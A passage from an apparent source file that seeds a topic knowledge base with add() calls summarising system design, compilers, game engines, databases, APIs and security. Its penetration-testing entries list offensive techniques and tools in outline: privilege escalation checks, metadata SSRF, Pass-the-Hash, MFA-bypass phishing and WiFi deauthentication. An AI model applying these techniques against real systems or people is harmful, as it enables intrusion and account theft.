    'Layer 2 scaling solutions: Increase blockchain throughput while inheriting L1 security. Optimistic Rollups: assume transactions valid, fraud proofs for disputes (7-day challenge period). Arbitrum: Nitro tech stack, AnyTrust chains. Optimism: OP Stack, Bedrock upgrade, superchain vision. ZK-Rollups: zero-knowledge proofs for validity (instant finality). zkSync Era: zkEVM, account abstraction native. StarkNet: STARK proofs, Cairo language. Polygon: PoS sidechain + zkEVM. Cross-chain: bridges (lock-and-mint), LayerZero (omnichain messaging), Chainlink CCIP. Data availability: EIP-4844 (proto-danksharding), celestia modular DA.', 0.85)

  // ── System Design ─────────────────────────────────────────────────────────────
  add('system_design', ['load balancer reverse proxy nginx haproxy', 'traffic distribution horizontal scaling', 'system design load balancing algorithms'],
    'Load balancing: Distribute traffic across servers for reliability and performance. Algorithms: Round Robin (sequential), Weighted Round Robin (capacity-based), Least Connections (route to least busy), IP Hash (sticky sessions), Consistent Hashing (minimal redistribution). L4 (transport): TCP/UDP level, faster, HAProxy. L7 (application): HTTP-aware, content-based routing, Nginx. Cloud: AWS ALB/NLB, GCP Load Balancer. Health checks: active (periodic probes) vs passive (monitor responses). Session persistence: sticky sessions, shared session store (Redis). SSL termination at load balancer. Global Server Load Balancing (GSLB) for multi-region.', 0.95)

  add('system_design', ['caching strategy redis memcached cdn', 'cache invalidation write-through write-back', 'distributed caching system design'],
    'Caching strategies: Reduce latency and database load. Levels: client-side (browser), CDN (edge), application (Redis/Memcached), database (query cache). Patterns: Cache-Aside (lazy load: check cache → miss → query DB → populate cache), Write-Through (write to cache + DB simultaneously), Write-Back (write to cache, async DB write), Write-Around (write to DB, invalidate cache). Redis: in-memory key-value, data structures (strings, hashes, sets, sorted sets, streams), pub/sub, Lua scripting, cluster mode. Eviction: LRU, LFU, TTL. CDN: CloudFront, Cloudflare — cache static assets at edge locations. Cache invalidation: TTL, event-driven, versioned keys.', 0.95)

  add('system_design', ['database sharding replication partitioning', 'sql nosql database selection scaling', 'database system design cap theorem'],
    'Database design: SQL vs NoSQL selection and scaling. SQL (PostgreSQL, MySQL): ACID transactions, joins, strong consistency, vertical scaling. NoSQL: MongoDB (documents), Cassandra (wide-column, AP), Redis (key-value), Neo4j (graph). CAP theorem: Consistency, Availability, Partition tolerance — choose two. Scaling: read replicas (primary-replica), sharding (partition data across nodes — range/hash/directory-based). Replication: synchronous (strong consistency, higher latency) vs asynchronous (eventual consistency, lower latency). Indexing: B-tree (range queries), hash (exact lookups), composite indexes. Connection pooling: PgBouncer, HikariCP.', 0.95)

  add('system_design', ['message queue kafka rabbitmq event streaming', 'asynchronous processing pub sub pattern', 'event driven architecture message broker'],
    'Message queues and event streaming: Decouple services and handle async processing. RabbitMQ: AMQP protocol, exchanges (direct/fanout/topic), queues, acknowledgments, dead letter queues. Apache Kafka: distributed log, topics with partitions, consumer groups, exactly-once semantics, high throughput (millions/sec). Use cases: order processing, notification systems, log aggregation, stream processing. Kafka Streams/ksqlDB for stream processing. Patterns: publish-subscribe, work queue, request-reply. SQS (AWS): managed queue, FIFO/Standard. Delivery guarantees: at-most-once, at-least-once, exactly-once. Backpressure handling and retry strategies.', 0.9)

  add('system_design', ['rate limiting api throttling token bucket', 'api gateway security rate limiter', 'system design rate limit algorithm'],
    'Rate limiting: Protect services from overload and abuse. Algorithms: Token Bucket (tokens refill at fixed rate, allows bursts), Leaky Bucket (constant output rate, smooths bursts), Fixed Window Counter (count per time window), Sliding Window Log (precise, memory-intensive), Sliding Window Counter (hybrid, practical). Implementation: Redis INCR + EXPIRE, Lua scripts for atomicity. HTTP headers: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, 429 Too Many Requests. Distributed rate limiting: Redis cluster, consistent hashing. Layers: API Gateway (Kong, AWS API Gateway), application middleware, reverse proxy (Nginx limit_req).', 0.9)

  add('system_design', ['distributed system consistency consensus', 'raft paxos consensus algorithm', 'system design distributed computing'],
    'Distributed systems fundamentals: Coordination and consensus. Consensus algorithms: Raft (leader election, log replication, safety — etcd, Consul), Paxos (theoretical foundation, complex). Consistency models: strong (linearizable), sequential, causal, eventual. Vector clocks for causality tracking. Distributed transactions: 2PC (two-phase commit), 3PC, Saga pattern (choreography/orchestration). Leader election: Bully algorithm, Raft. Failure detection: heartbeats, phi accrual detector. Split-brain: quorum-based decisions, fencing tokens. Idempotency keys for exactly-once processing. Crdt for conflict-free replicated data types.', 0.9)

  add('system_design', ['url shortener design interview question', 'system design interview scalable architecture', 'design twitter instagram feed system'],
    'System design interview patterns: URL shortener — base62 encoding, KGS (key generation service), read-heavy caching, analytics pipeline. Twitter/feed: fan-out on write (push to follower feeds) vs fan-out on read (pull at read time), hybrid for celebrities. Instagram: CDN for images, metadata DB, story/feed ranking. Chat system: WebSocket for real-time, message queue per user, presence service, group chat fanout. Notification: priority queues, rate limiting per user, template engine, delivery tracking. Common components: API Gateway, Load Balancer, CDN, Cache, Message Queue, Database (SQL + NoSQL), Search (Elasticsearch), Monitoring.', 0.9)

  // ── Compiler & Language Design ────────────────────────────────────────────────
  add('compiler_language_design', ['lexer tokenizer scanner lexical analysis', 'programming language compiler lexer implementation', 'token regular expression lexical analysis'],
    'Lexical analysis (scanning/tokenization): First compiler phase. Converts source characters into tokens. Token types: keywords (if/while/return), identifiers, literals (numbers/strings), operators (+, -, ==), delimiters ({, }, ;). Implementation: finite automata (DFA from regex), hand-written scanner (switch-based, faster), or generator tools (Flex/re2c). Lexer handles: whitespace skipping, comment removal, string literal escaping, number parsing (int/float/hex/binary). Error recovery: skip to next recognizable token. Outputs token stream: {type, value, line, column}. Unicode support: UTF-8 decoding, identifier categories.', 0.95)

  add('compiler_language_design', ['parser syntax analysis ast abstract syntax tree', 'recursive descent parser grammar cfg', 'parser generator yacc bison antlr'],
    'Parsing (syntax analysis): Second compiler phase. Converts token stream into AST. Context-free grammar (CFG): production rules, BNF/EBNF notation. Parsing strategies: top-down (start from root) — recursive descent (hand-written, predictable, LL(k)), Pratt parser (operator precedence climbing). Bottom-up: LR parsers (SLR, LALR, CLR), shift-reduce. Generator tools: ANTLR (LL(*), multiple languages), Yacc/Bison (LALR), tree-sitter (incremental, editors). AST nodes: expressions (binary, unary, call, literal), statements (if, while, return, block), declarations (function, variable, class). Error recovery: synchronization tokens, panic mode.', 0.95)

  add('compiler_language_design', ['type system type checking inference', 'static type checking hindley milner', 'generic types polymorphism type theory'],
    'Type systems: Ensure program correctness at compile time. Type checking: static (compile-time, catches errors early) vs dynamic (runtime). Hindley-Milner: Algorithm W, complete type inference for ML-family languages, principal types. Features: generics/parametric polymorphism (List<T>), algebraic data types (sum/product types), type classes/traits (ad-hoc polymorphism), dependent types (types depend on values). Subtyping: structural (Go interfaces) vs nominal (Java classes). Variance: covariant (out), contravariant (in), invariant. Gradual typing: mix static and dynamic (TypeScript, Python type hints). Flow-sensitive typing: narrowing via control flow analysis.', 0.9)

  add('compiler_language_design', ['code generation ir llvm backend', 'intermediate representation optimization', 'llvm compiler backend code generation'],
    'Code generation and optimization: Transform AST/IR into target code. Intermediate representations: SSA (Static Single Assignment), three-address code, LLVM IR. LLVM: modular compiler infrastructure, IR → optimization passes → target codegen. Optimization passes: constant folding, dead code elimination, common subexpression elimination, loop unrolling, function inlining, register allocation (graph coloring), instruction scheduling. Backend: instruction selection (tree pattern matching), register allocation, instruction scheduling, machine code emission. JIT compilation: runtime code generation (V8 TurboFan, LuaJIT). AOT vs JIT tradeoffs.', 0.9)

  add('compiler_language_design', ['garbage collection memory management gc', 'reference counting mark sweep gc algorithm', 'memory allocator runtime system'],
    'Memory management in language runtimes: Manual (C/C++ malloc/free) vs automatic (GC). Reference counting: increment/decrement on assign, free at zero — simple but cannot handle cycles (Swift uses weak refs). Tracing GC: Mark-and-Sweep (mark reachable from roots, sweep unmarked), Mark-Compact (reduce fragmentation), Copying GC (semispace, fast allocation). Generational GC: young/old generations, minor/major collections (V8, JVM G1). Concurrent GC: minimize pause times (Go tri-color marking, ZGC < 1ms pauses). Region-based: arena allocation, bulk deallocation. Rust: ownership + borrowing (compile-time, zero-cost). Escape analysis for stack allocation.', 0.9)

  add('compiler_language_design', ['interpreter virtual machine bytecode', 'stack machine register machine vm', 'bytecode compiler virtual machine design'],
    'Virtual machines and interpreters: Execute programs without native compilation. Tree-walking interpreter: traverse AST, evaluate nodes directly (simple, slow). Bytecode compiler + VM: compile AST to bytecode instructions, execute on virtual machine. Stack-based VM: push/pop operands (JVM, CPython, Lua 4) — simple codegen, compact bytecode. Register-based VM: named registers (Lua 5, Dalvik) — fewer instructions, larger bytecode. Bytecode instructions: LOAD_CONST, ADD, CALL, JUMP, RETURN. Optimization: inline caching (V8), computed goto (CPython), NaN boxing (value representation), string interning, hash consing.', 0.9)

  // ── Game Development ─────────────────────────────────────────────────────────

  add('game_development', ['unity game engine c# scripting', 'unity monobehaviour lifecycle component', 'unity physics rigidbody collider'],
    'Unity game development: C# scripting with MonoBehaviour lifecycle (Awake → OnEnable → Start → FixedUpdate → Update → LateUpdate → OnDisable → OnDestroy). Component-based architecture: attach scripts to GameObjects. Physics: Rigidbody (mass, drag, gravity), Colliders (BoxCollider, SphereCollider, MeshCollider), triggers (OnTriggerEnter/Stay/Exit). Input: Input.GetAxis("Horizontal"), new Input System (InputAction maps). Coroutines: yield return new WaitForSeconds(). ScriptableObjects for data-driven design. Prefabs for reusable GameObjects. Asset bundles and Addressables for content management.', 0.9)

  add('game_development', ['unreal engine c++ blueprint', 'unreal engine actor component gameplay', 'ue5 nanite lumen virtual shadow map'],
    'Unreal Engine development: C++ and Blueprint visual scripting. Actor/Component model: AActor base class, UActorComponent for logic. Gameplay framework: AGameModeBase, APlayerController, APawn, ACharacter. UE5 features: Nanite (virtualized geometry, billions of polygons), Lumen (global illumination, software/hardware ray tracing), Virtual Shadow Maps, World Partition (open world streaming). Blueprints: visual node graphs, communicate with C++ via UFUNCTION/UPROPERTY macros. Enhanced Input System. Gameplay Ability System (GAS) for complex abilities. Niagara particle system. MetaSounds audio.', 0.9)

  add('game_development', ['godot gdscript game engine', 'godot scene tree node system', 'godot 4 vulkan rendering gdextension'],
    'Godot game engine: Open-source, scene tree architecture. GDScript (Python-like), C#, C++ via GDExtension. Node system: Node2D, Sprite2D, CharacterBody2D, Area2D, Camera2D. Scene tree: parent-child hierarchy, scene instancing. Signals: built-in observer pattern (_on_body_entered). Physics: CharacterBody2D.move_and_slide(), RigidBody2D. Godot 4: Vulkan renderer, GDExtension (replace GDNative), improved 3D, typed GDScript. TileMap for 2D levels. AnimationPlayer/AnimationTree for character animation. Export to Windows, Linux, macOS, Android, iOS, Web.', 0.85)

  add('game_development', ['game physics engine collision detection', 'broad phase narrow phase collision', 'rigid body dynamics physics simulation'],
    'Game physics engines: Simulate realistic physical interactions. Collision detection: Broad phase (spatial hashing, AABB tree, sweep-and-prune) narrows candidate pairs → Narrow phase (GJK, SAT, MPR algorithms) finds exact contacts. Rigid body dynamics: Newton-Euler equations, impulse-based resolution, sequential impulse solver. Constraints: joints (hinge, ball-socket, slider), motors, limits. Continuous collision detection (CCD) prevents tunneling. Physics engines: Box2D (2D), Bullet (3D), PhysX (NVIDIA), Jolt (modern C++), Rapier (Rust). Deterministic physics for multiplayer synchronization.', 0.85)

  add('game_development', ['entity component system ecs game architecture', 'data oriented design game performance', 'game design pattern state machine'],
    'Game architecture patterns: Entity Component System (ECS): entities are IDs, components are pure data, systems process components in batch (cache-friendly). Unity DOTS: Entity, IComponentData, SystemBase. Data-Oriented Design (DOD): optimize for CPU cache, Structure of Arrays (SoA) vs Array of Structures (AoS). State machines: finite state machine (FSM) for AI/animation, hierarchical state machine (HFSM), behavior trees (selector/sequence/decorator nodes). Object pooling: reuse objects instead of allocate/free. Command pattern for input replay/undo. Observer pattern for events.', 0.9)

  add('game_development', ['game networking multiplayer synchronization', 'client server authoritative netcode', 'network prediction rollback netcode'],
    'Multiplayer game networking: Client-server architecture with authoritative server. Synchronization: state synchronization (send full state) vs input synchronization (send inputs). Prediction: client-side prediction (apply input immediately, reconcile with server), entity interpolation (buffer and interpolate between server snapshots). Rollback netcode: store game state history, on misprediction rollback to last confirmed state and resimulate (fighting games, GGPO). Tick rate: 60Hz server, 20-30Hz network updates. UDP for real-time, reliable UDP (ENet, KCP). Lag compensation: server-side rewind for hit detection.', 0.85)

  add('game_development', ['game shader programming hlsl glsl', 'vertex fragment shader rendering pipeline', 'pbr physically based rendering shader'],
    'Game shader programming: GPU programs for visual effects. Rendering pipeline: Vertex Shader (transform positions) → Rasterization → Fragment/Pixel Shader (compute color). Languages: HLSL (DirectX/Unity), GLSL (OpenGL/Vulkan), WGSL (WebGPU), Metal Shading Language. Physically Based Rendering (PBR): albedo, metallic, roughness, normal maps. Cook-Torrance BRDF. Post-processing: bloom, tone mapping, ambient occlusion (SSAO/HBAO), screen-space reflections. Compute shaders for GPU computation. Shader graph tools: Unity Shader Graph, Unreal Material Editor, Godot Visual Shader.', 0.85)

  add('game_development', ['game ai pathfinding behavior tree', 'a-star navigation mesh steering behavior', 'game artificial intelligence decision making'],
    'Game AI systems: Pathfinding: A* algorithm (heuristic search on grid/graph), Navigation Meshes (NavMesh — walkable surface polygons, agent radius/height), Dijkstra (uniform cost), Jump Point Search (optimized A* for grids). Steering behaviors: seek, flee, arrive, wander, obstacle avoidance, flocking (separation, alignment, cohesion). Decision making: Behavior Trees (selector, sequence, parallel, decorator nodes), Utility AI (score actions by utility functions), GOAP (Goal-Oriented Action Planning — plan sequences to achieve goals). Finite state machines for simple AI. Influence maps for tactical awareness.', 0.85)

  // ── Cybersecurity / Penetration Testing ─────────────────────────────────────

  add('cybersecurity_pentest', ['penetration testing methodology oscp', 'pentest reconnaissance enumeration scanning', 'ethical hacking penetration testing phases'],
    'Penetration testing methodology: Systematic approach to finding security vulnerabilities. Phases: 1) Reconnaissance — passive (OSINT, Shodan, Google dorks, theHarvester) and active (Nmap, Masscan). 2) Enumeration — service versioning, directory brute-force (Gobuster, Feroxbuster, dirsearch), subdomain enum (Sublist3r, Amass). 3) Vulnerability Analysis — CVE lookup, vulnerability scanners (Nessus, OpenVAS). 4) Exploitation — Metasploit, manual exploits. 5) Post-exploitation — privilege escalation, lateral movement, data exfiltration. 6) Reporting — findings, risk ratings, remediation. Standards: PTES, OWASP Testing Guide, OSSTMM.', 0.9)

  add('cybersecurity_pentest', ['web application security owasp top 10', 'sql injection xss csrf web vulnerability', 'web pentest burp suite zap'],
    'Web application security testing: OWASP Top 10 vulnerabilities. SQL Injection: UNION-based, blind (boolean/time), error-based, second-order. Tools: SQLMap. XSS: Reflected, Stored, DOM-based — payload encoding, WAF bypass. CSRF: cross-site request forgery, token-based prevention. SSRF: Server-Side Request Forgery, cloud metadata attacks. XXE: XML External Entity injection. IDOR: Insecure Direct Object Reference. Authentication flaws: brute force, credential stuffing, JWT attacks (algorithm confusion, none signature). Tools: Burp Suite (proxy, scanner, intruder, repeater), OWASP ZAP, Nikto.', 0.9)

  add('cybersecurity_pentest', ['privilege escalation linux windows', 'linux privesc suid kernel exploit', 'windows privilege escalation service misconfiguration'],
    'Privilege escalation techniques: Linux — SUID/SGID binaries (find / -perm -4000), sudo misconfigurations (sudo -l), kernel exploits (DirtyPipe, DirtyCow), cron job abuse, writable /etc/passwd, capabilities abuse, NFS no_root_squash, LD_PRELOAD hijacking. Tools: LinPEAS, linEnum, linux-exploit-suggester. Windows — service misconfigurations (unquoted paths, weak permissions), DLL hijacking, token impersonation (Potato attacks), AlwaysInstallElevated, SeImpersonatePrivilege, Unattend.xml credentials, SAM database extraction. Tools: WinPEAS, PowerUp, BeRoot, Seatbelt, SharpUp. Automated: privilege escalation checklists.', 0.9)

  add('cybersecurity_pentest', ['network penetration testing nmap metasploit', 'internal network assessment lateral movement', 'network pivoting port forwarding tunneling'],
    'Network penetration testing: Scanning with Nmap (SYN scan, version detection, OS fingerprinting, NSE scripts), Masscan (fast port scanning). Service exploitation: SMB (EternalBlue, relay attacks), SSH (key-based, brute force), FTP (anonymous access), SNMP (community string enumeration). Lateral movement: Pass-the-Hash, PSExec, WMI, PowerShell remoting, RDP hijacking. Pivoting: SSH tunneling (local/remote/dynamic), Chisel, Ligolo-ng, SSHuttle, Proxychains. Port forwarding for accessing internal services. C2 frameworks: Cobalt Strike, Sliver, Havoc. Internal network: ARP spoofing, LLMNR/NBT-NS poisoning (Responder).', 0.9)

  add('cybersecurity_pentest', ['wireless security wifi hacking wpa', 'wifi penetration testing aircrack', 'bluetooth ble security attack'],
    'Wireless security testing: WiFi — WPA/WPA2 attacks: 4-way handshake capture (airodump-ng), dictionary attack (aircrack-ng, hashcat), PMKID attack (hcxdumptool), evil twin (hostapd, Fluxion), deauthentication attack (aireplay-ng). WPA3: SAE Dragonfly handshake, limited attacks. WPS: Reaver/Bully PIN brute force. Tools: Aircrack-ng suite, Bettercap, WiFi Pineapple. Bluetooth: BLE sniffing (Ubertooth), MITM attacks, pairing exploitation, BLEah. RFID/NFC: Proxmark3, ACR122U, card cloning. Software-Defined Radio (SDR): HackRF, RTL-SDR for signal analysis.', 0.85)

  add('cybersecurity_pentest', ['cloud security assessment aws azure gcp', 'cloud penetration testing misconfiguration', 'cloud security posture management cspm'],
    'Cloud security assessment: AWS — S3 bucket misconfiguration (public access), IAM policy analysis, Lambda function vulnerabilities, EC2 metadata SSRF (169.254.169.254), CloudTrail log analysis. Azure — Blob storage exposure, managed identity abuse, Azure AD attacks, token manipulation. GCP — service account key leakage, bucket ACL misconfig. Tools: ScoutSuite, Prowler (AWS), CloudMapper, Pacu (AWS exploitation), AzureHound, ROADrecon. Cloud-specific attacks: credential exposure in repositories, insecure API endpoints, serverless injection, container escape. Compliance: CIS Benchmarks, CSPM tools (Prisma Cloud, Wiz).', 0.85)

  add('cybersecurity_pentest', ['social engineering phishing attack simulation', 'phishing campaign vishing pretexting', 'security awareness training social engineering'],
    'Social engineering and phishing: Human-factor attacks bypassing technical controls. Phishing: crafted emails with malicious links/attachments, credential harvesting pages, spear phishing (targeted). Tools: GoPhish (campaign management), Evilginx2 (reverse proxy phishing, MFA bypass), SET (Social Engineer Toolkit), King Phisher. Vishing: voice phishing, caller ID spoofing. Pretexting: creating fabricated scenarios. USB drop attacks: Rubber Ducky, Bash Bunny. Watering hole attacks: compromise frequently visited sites. Defense: security awareness training, phishing simulations, DMARC/SPF/DKIM, email gateway filtering.', 0.85)

  add('cybersecurity_pentest', ['malware analysis reverse engineering', 'static dynamic malware analysis sandboxing', 'binary reverse engineering ida ghidra'],
    'Malware analysis and reverse engineering: Static analysis — file type identification (file, TrID), PE/ELF header analysis, string extraction, import/export tables, YARA rules, VirusTotal lookup. Dynamic analysis — sandboxing (Cuckoo, ANY.RUN, Joe Sandbox), process monitoring (Process Monitor), network capture (Wireshark, FakeNet-NG), API hooking. Reverse engineering tools: IDA Pro/Free (disassembly), Ghidra (NSA, free), Binary Ninja, Radare2/Cutter, x64dbg/OllyDbg (Windows debuggers). Techniques: unpacking, deobfuscation, control flow analysis, identifying C2 communications, cryptographic function identification.', 0.85)

  // ── Database Engineering ────────────────────────────────────────────────────

  add('database_engineering', ['postgresql advanced features query optimization', 'postgres indexing btree gin gist', 'postgresql partitioning vacuum analyze'],
    'PostgreSQL advanced features: Indexing — B-tree (default, equality/range), GIN (full-text search, JSONB, arrays), GiST (geometric, range types), BRIN (block range, time-series). Query optimization: EXPLAIN ANALYZE, pg_stat_statements, index-only scans, covering indexes (INCLUDE), partial indexes (WHERE clause). Partitioning: range, list, hash partitioning for large tables. VACUUM: removes dead tuples, autovacuum configuration. CTEs: WITH queries, recursive CTEs for hierarchical data. Window functions: ROW_NUMBER(), RANK(), LAG()/LEAD(), NTILE(). JSONB: document storage within relational DB, GIN indexing, containment operators.', 0.9)

  add('database_engineering', ['redis data structures caching patterns', 'redis pub-sub streams sorted set', 'redis cluster sentinel high availability'],
    'Redis engineering: In-memory data store, sub-millisecond latency. Data structures: Strings (GET/SET, INCR), Lists (LPUSH/RPOP, message queues), Sets (SADD/SMEMBERS, unique items), Sorted Sets (ZADD/ZRANGE, leaderboards, rate limiters), Hashes (HSET/HGET, objects), Streams (XADD/XREAD, event sourcing), HyperLogLog (cardinality estimation), Bitmaps. Patterns: cache-aside, write-through, write-behind. Pub/Sub for real-time messaging. Redis Streams for event processing. Lua scripting (EVAL) for atomic operations. Cluster: hash slots (16384), automatic sharding. Sentinel: high availability, automatic failover. Persistence: RDB snapshots, AOF (append-only file).', 0.9)

  add('database_engineering', ['mongodb document database aggregation', 'nosql document store mongodb atlas', 'mongodb indexing sharding replica set'],
    'MongoDB document database: BSON documents in collections, flexible schema. CRUD: insertOne/Many, find (query filters, projections), updateOne/Many ($set, $inc, $push, $pull), deleteOne/Many. Aggregation pipeline: $match, $group, $project, $lookup (joins), $unwind, $sort, $limit. Indexing: compound, multikey (arrays), text, geospatial (2dsphere), wildcard, TTL indexes (auto-expire). Replica sets: primary + secondaries, automatic failover, read preferences. Sharding: shard key selection (cardinality, frequency, monotonicity), range vs hashed sharding. Change streams for real-time data sync. Atlas: managed cloud service, serverless, Atlas Search (Lucene-based).', 0.9)

  add('database_engineering', ['database migration schema evolution flyway', 'schema migration liquibase alembic prisma', 'zero downtime database migration strategy'],
    'Database migrations and schema evolution: Migration tools — Flyway (Java, SQL-based, V1__description.sql), Liquibase (changelog XML/YAML/SQL), Alembic (Python/SQLAlchemy), Prisma Migrate (TypeScript), golang-migrate, Knex.js migrations. Zero-downtime migrations: expand-and-contract pattern (add new column → backfill → migrate code → drop old). Avoid: renaming columns directly, adding NOT NULL without defaults, large table locks. Online schema change: pt-online-schema-change (MySQL), pg_repack (PostgreSQL). Blue-green deployments for DB changes. Feature flags to control migration rollout. Version control all migration scripts.', 0.85)

  add('database_engineering', ['database replication master slave synchronization', 'database high availability failover clustering', 'mysql innodb replication galera'],
    'Database replication and high availability: Replication types — synchronous (strong consistency, higher latency), asynchronous (eventual consistency, lower latency), semi-synchronous (at least one replica confirms). MySQL: InnoDB Cluster (Group Replication), Galera Cluster (synchronous multi-master), GTID-based replication, read replicas. PostgreSQL: streaming replication, logical replication (selective table sync), Patroni (HA management), PgBouncer (connection pooling). Failover strategies: automatic (orchestrator, Patroni), manual promotion. Split-brain prevention: fencing, quorum-based decisions. Backup: pg_dump, mysqldump, WAL archiving, point-in-time recovery (PITR).', 0.85)

  add('database_engineering', ['time series database influxdb timescaledb', 'olap analytical database clickhouse', 'columnar database analytics warehouse'],
    'Specialized databases: Time-series — InfluxDB (Flux query language, retention policies, continuous queries), TimescaleDB (PostgreSQL extension, hypertables, compression), Prometheus (metrics, PromQL). OLAP/Analytics — ClickHouse (columnar, real-time analytics, MergeTree engine), Apache Druid (real-time OLAP), DuckDB (in-process analytical, OLAP on files). Data warehouses — Snowflake (separate compute/storage), BigQuery (serverless, SQL), Redshift. Columnar storage: better compression, vectorized execution, efficient aggregation. Graph databases: Neo4j (Cypher query), Amazon Neptune. Vector databases: Pinecone, Milvus, pgvector for AI/embedding search.', 0.85)

  add('database_engineering', ['sql query optimization execution plan', 'database query tuning slow query analysis', 'sql performance indexing explain analyze'],
    'SQL query optimization: EXPLAIN/EXPLAIN ANALYZE to read execution plans. Key concepts: sequential scan vs index scan, nested loop vs hash join vs merge join. Optimization: add appropriate indexes (covering, partial, composite), avoid SELECT *, use LIMIT for pagination, optimize JOINs (join order, index on join columns). N+1 query problem: use eager loading (JOIN), batch queries. Slow query log analysis: MySQL slow_query_log, PostgreSQL pg_stat_statements, log_min_duration_statement. Connection pooling: PgBouncer, ProxySQL, HikariCP. Query hints when optimizer chooses wrong plan. Materialized views for expensive aggregations. Database profiling and monitoring: pgBadger, Percona Monitoring.', 0.9)

  add('database_engineering', ['distributed database newql cockroachdb spanner', 'distributed sql consensus transaction', 'global database multi-region consistency'],
    'Distributed SQL databases (NewSQL): Combine SQL semantics with horizontal scalability. CockroachDB: PostgreSQL-compatible, Raft consensus, range-based sharding, serializable isolation, multi-region deployments. Google Spanner: globally distributed, TrueTime (GPS + atomic clocks) for external consistency. TiDB: MySQL-compatible, TiKV storage (Raft), HTAP (hybrid transactional-analytical). YugabyteDB: PostgreSQL-compatible, Raft consensus. Key concepts: distributed transactions (2PC with consensus), consistent hashing, linearizable reads, follower reads for latency. Multi-region patterns: geo-partitioning, regional tables, survival goals (region vs zone failure).', 0.85)

  // ── API Design & GraphQL ────────────────────────────────────────────────────

  add('api_design_graphql', ['rest api design best practices', 'restful api resource naming versioning', 'rest api pagination filtering hateoas'],
    'REST API design best practices: Resource-oriented URLs (/users/{id}/orders). HTTP methods: GET (read), POST (create), PUT (full update), PATCH (partial update), DELETE. Status codes: 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests, 500 Internal Server Error. Versioning: URL path (/v1/), header (Accept: application/vnd.api+json;version=1), query param. Pagination: cursor-based (efficient, no skip), offset-based (simple). Filtering: ?status=active&sort=-created_at. HATEOAS: include links for discoverability. Content negotiation: Accept/Content-Type headers.', 0.9)

  add('api_design_graphql', ['graphql schema query mutation subscription', 'graphql resolver dataloader n+1', 'graphql api apollo server federation'],
    'GraphQL API development: Schema Definition Language (SDL): type Query, Mutation, Subscription. Types: scalar (String, Int, Float, Boolean, ID), object, input, enum, union, interface. Resolvers: functions mapping schema fields to data. N+1 problem: DataLoader (batching + caching per request). Apollo Server: schema, resolvers, context, plugins. Apollo Federation: compose multiple GraphQL services into a supergraph (@key, @external, @requires). Subscriptions: WebSocket-based real-time updates (graphql-ws). Fragments for query reuse. Variables for dynamic queries. Directives: @deprecated, @auth custom directives. Tools: GraphQL Playground, Apollo Studio, Altair.', 0.9)

  add('api_design_graphql', ['grpc protocol buffers microservice', 'grpc streaming bidirectional protobuf', 'grpc service definition load balancing'],
    'gRPC for microservices: Protocol Buffers (protobuf) for schema definition — .proto files with message and service definitions. Code generation: protoc compiler generates client/server stubs. Communication patterns: Unary (request-response), Server Streaming, Client Streaming, Bidirectional Streaming. HTTP/2 transport: multiplexing, header compression, binary framing. Performance: 10x faster than JSON REST for serialization/deserialization. Load balancing: client-side (pick_first, round_robin), proxy-based (Envoy), service mesh. Interceptors: logging, authentication, retry. gRPC-Web for browser clients. Reflection for service discovery. Health checking protocol.', 0.85)

  add('api_design_graphql', ['openapi swagger api documentation', 'api specification design first approach', 'openapi code generation contract testing'],
    'OpenAPI/Swagger specification: Design-first API development. OpenAPI 3.x: paths, operations, parameters, request/response bodies, schemas (JSON Schema), security schemes, servers. Swagger UI: interactive API documentation. Swagger Editor: write and validate specs. Code generation: openapi-generator (50+ languages), client SDKs, server stubs. Contract testing: validate API implementation matches spec (Dredd, Schemathesis, Prism mock server). API design-first workflow: write spec → review → generate code → implement → test. Tools: Stoplight, Redocly, Postman (collections, environments, tests, mock servers). API linting: Spectral rules for consistent API design.', 0.85)

  add('api_design_graphql', ['api authentication oauth2 jwt tokens', 'api security rate limiting cors', 'api key management token refresh'],
    'API authentication and security: OAuth 2.0 flows — Authorization Code (web apps + PKCE for SPAs), Client Credentials (machine-to-machine), Device Authorization (IoT/TVs). JWT: header.payload.signature, RS256 (asymmetric) vs HS256 (symmetric), claims (iss, sub, exp, aud). Refresh tokens: rotation, secure storage (httpOnly cookies). API keys: simple authentication, rate limiting per key. Security: CORS configuration (Access-Control-Allow-Origin), rate limiting (token bucket, sliding window), input validation, SQL injection prevention, HTTPS enforcement. API gateways: Kong, Tyk, AWS API Gateway — handle auth, rate limiting, transformation.', 0.9)

  add('api_design_graphql', ['webhook event driven api integration', 'webhook retry delivery guarantee', 'event notification api callback'],
    'Webhooks and event-driven APIs: Push-based notifications when events occur. Pattern: register callback URL → event triggers → HTTP POST with payload to callback. Delivery guarantees: retry with exponential backoff (1s, 2s, 4s, 8s...), idempotency keys to prevent duplicate processing. Verification: HMAC signature validation (X-Hub-Signature, Stripe-Signature), timestamp checking for replay prevention. Webhook management: registration endpoints, event type filtering, secret rotation, delivery logs. Best practices: respond 2xx quickly, process async (queue the payload), handle out-of-order events, store raw payloads. Alternatives: Server-Sent Events (SSE), WebSockets, long polling.', 0.85)

  add('api_design_graphql', ['api versioning strategy backward compatibility', 'api evolution deprecation migration', 'api gateway routing transformation'],
    'API versioning and evolution: Strategies — URI versioning (/v1/users), header versioning (Accept-Version: v1), content negotiation (Accept: application/vnd.api.v1+json). Backward compatibility: additive changes are safe (new fields, endpoints), breaking changes need new version. Deprecation: Sunset header, deprecation warnings, migration guides, overlap period. API gateway: centralized routing, request/response transformation, rate limiting, caching, circuit breaker. Gateway patterns: Backend for Frontend (BFF), API composition, protocol translation (REST → gRPC). Tools: Kong, Tyk, AWS API Gateway, Apigee. API lifecycle: design → develop → test → deploy → monitor → deprecate → retire.', 0.85)

  // ── DevSecOps ──────────────────────────────────────────────────────────────

  add('devsecops', ['sast static application security testing', 'static code analysis security scanning', 'sonarqube semgrep codeql sast tools'],
    'SAST (Static Application Security Testing): Analyze source code without execution. Tools: SonarQube (multi-language, quality gates, technical debt), Semgrep (lightweight, custom rules, pattern matching), CodeQL (GitHub, semantic analysis, query language), Snyk Code (ML-powered, IDE integration), Checkmarx, Fortify. Detects: SQL injection, XSS, path traversal, hardcoded secrets, insecure configurations. Integration: CI/CD pipeline stage (fail builds on critical findings), IDE plugins (shift-left), pre-commit hooks. False positive management: suppress with comments, triage workflow. Custom rules: Semgrep YAML patterns, CodeQL queries.', 0.9)

  add('devsecops', ['dast dynamic application security testing', 'runtime security scanning zap burp', 'dast web application scanner nuclei'],
